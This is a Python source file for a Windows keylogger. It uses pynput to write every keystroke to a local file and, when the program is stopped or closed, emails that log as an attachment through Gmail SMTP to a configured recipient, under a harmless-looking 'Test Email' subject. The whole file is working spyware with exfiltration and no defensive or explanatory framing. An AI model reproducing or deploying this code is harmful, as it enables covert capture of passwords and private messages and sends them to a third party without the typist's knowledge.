from pynput import keyboard
import smtplib
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email import encoders
import atexit
import signal
import sys
import win32api

# Set up the SMTP server and login details
smtp_server = 'smtp.gmail.com'
smtp_port = 587
sender_email = 'sender@gmail.com' # ur sender email
password = '###########' # set up ur app password on the google SMTP
recipient_email = 'receiver@gmail.com'# ur receiver email
file_path = 'keyfile.txt'

# Create the email
msg = MIMEMultipart()
msg['From'] = sender_email
msg['To'] = recipient_email
msg['Subject'] = 'Test Email with Attachment from Python'

# Add the body of the email
body = 'This is a test email sent from Python with an attachment!'
msg.attach(MIMEText(body, 'plain'))

def sendemail():
    try:
    # Open the file in binary mode
        with open(file_path, 'rb') as attachment:
            # Create a MIMEBase object
            part = MIMEBase('application', 'octet-stream')
            part.set_payload(attachment.read())
        
        # Encode the payload using Base64
        encoders.encode_base64(part)
        
        # Add header for the attachment
        part.add_header('Content-Disposition', f'attachment; filename={file_path}')
        
        # Attach the MIMEBase object to the email
        msg.attach(part)
    except Exception as e:
        print(f'Could not read file: {e}')

    try:
        # Set up the SMTP server
        server = smtplib.SMTP(smtp_server, smtp_port)
        server.starttls()  # Secure the connection
        server.login(sender_email, password)
        
        # Send the email
        server.send_message(msg)
        print('Email sent successfully')
        
    except Exception as e:
        print(f'Error: {e}')
    finally:
        # Close the connection
        server.quit()

def keyPressed(key):
    print(str(key))
    with open("keyfile.txt", 'a') as logkey:
        try:
            char = key.char
            logkey.write(char)
        except:
            print("Error")

#atexit.register(sendemail)

def signal_handler(signal_received, frame):
    sendemail()
    sys.exit(0)  # Ensure program exits after cleanup

def on_exit(signal_received=None, frame=None):
    sendemail()

signal.signal(signal.SIGTERM, signal_handler)
signal.signal(signal.SIGINT, signal_handler)
win32api.SetConsoleCtrlHandler(on_exit, True)

if __name__ == "__main__":
    while True:
        # Simulate some work being done
        listener = keyboard.Listener(on_press=keyPressed)
        listener.start()
        input()
    

